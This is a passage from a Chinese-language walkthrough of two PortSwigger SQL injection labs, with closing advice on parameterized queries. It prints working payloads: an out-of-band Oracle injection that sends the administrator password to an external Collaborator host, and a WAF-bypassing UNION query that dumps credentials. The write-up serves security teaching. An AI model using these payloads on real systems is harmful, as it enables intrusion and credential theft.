![1693066842_64ea265a6e5e3776afe67.png!small](https://image.3001.net/images/20230827/1693066842_64ea265a6e5e3776afe67.png!small)

### lab17: 带外数据泄露的SQL盲注

  * 和上一题类似，这里我们利用sql注入的payload与 Collaborator 服务器的交互中，使其在回显中显示管理员的密码。

'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.200kdxxiuefme9o0m2j55195mwsngc.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--
![1693066857_64ea266977649f7cf3fc7.png!small](https://image.3001.net/images/20230827/1693066857_64ea266977649f7cf3fc7.png!small)

  * 输入登录该密码

![1693066871_64ea2677c93b93e999724.png!small](https://image.3001.net/images/20230827/1693066871_64ea2677c93b93e999724.png!small)

### lab18: 通过 XML 编码绕过过滤器的 SQL 注入

  * 这道题和之前的题目有所区别，首先我们在首页面没有看见任何选项栏，只有查看商品

![1693066885_64ea2685a7cb929d9c798.png!small](https://image.3001.net/images/20230827/1693066885_64ea2685a7cb929d9c798.png!small)

  * 我们开启抓包，点进任意一个商品，在post请求下看到存在xml格式的内容

![1693066898_64ea269279c186b9475f5.png!small](https://image.3001.net/images/20230827/1693066898_64ea269279c186b9475f5.png!small)

  * 看到xml我们可以联想这个地方有没有可能存在注入，首先替换storeId为数学表达式，发现返回结果一模一样

![1693066910_64ea269edad0914fae9c8.png!small](https://image.3001.net/images/20230827/1693066910_64ea269edad0914fae9c8.png!small)

  * 替换为sql语句payload： <storeId>1 UNION SELECT NULL</storeId> 这里报403，应该是被waf拦了

![1693066923_64ea26ab9724700ddeedb.png!small](https://image.3001.net/images/20230827/1693066923_64ea26ab9724700ddeedb.png!small)

  * 这里可以利用HackVertor插件对payload进行混淆来绕过waf

![1693066937_64ea26b90b2a7d8e69300.png!small](https://image.3001.net/images/20230827/1693066937_64ea26b90b2a7d8e69300.png!small)

  * 修改payload，成功爆出账号密码： 1 UNION SELECT username || '~' || password FROM users

![1693066951_64ea26c77527123c71e55.png!small](https://image.3001.net/images/20230827/1693066951_64ea26c77527123c71e55.png!small)

  

# 预防sql注入

大多数 SQL 注入实例可以通过使用参数化查询（也称为准备好的语句）而不是查询中的字符串连接来防止。

以下代码容易受到 SQL 注入攻击，因为用户输入直接连接到查询中：

String query = "SELECT * FROM products WHERE category = '"+ input + "'";  
Statement statement = connection.createStatement();  
ResultSet resultSet = statement.executeQuery(query);

对该代码重写，以防止用户输入干扰查询结构：

PreparedStatement statement = connection.prepareStatement("SELECT * FROM
products WHERE category = ?");

statement.setString(1, input);

ResultSet resultSet = statement.executeQuery();

参数化查询可用于不受信任的输入作为查询中的数据出现的任何情况，包括or语句、WHERE中的子句和值。它们不能用于处理查询其他部分中不受信任的输入，例如表名、列名或子句。将不受信任的数据放入查询的这些部分的应用程序功能将需要采取不同的方法，例如将允许的输入值列入白名单，或使用不同的逻辑来提供所需的行为。
INSERT、UPDATE、ORDER BY。

为了使参数化查询有效防止 SQL 注入，查询中使用的字符串必须始终是硬编码常量，并且绝不能包含来自任何来源的任何变量数据。

# 参考链接

https://portswigger.net/web-security/sql-injection/cheat-sheet

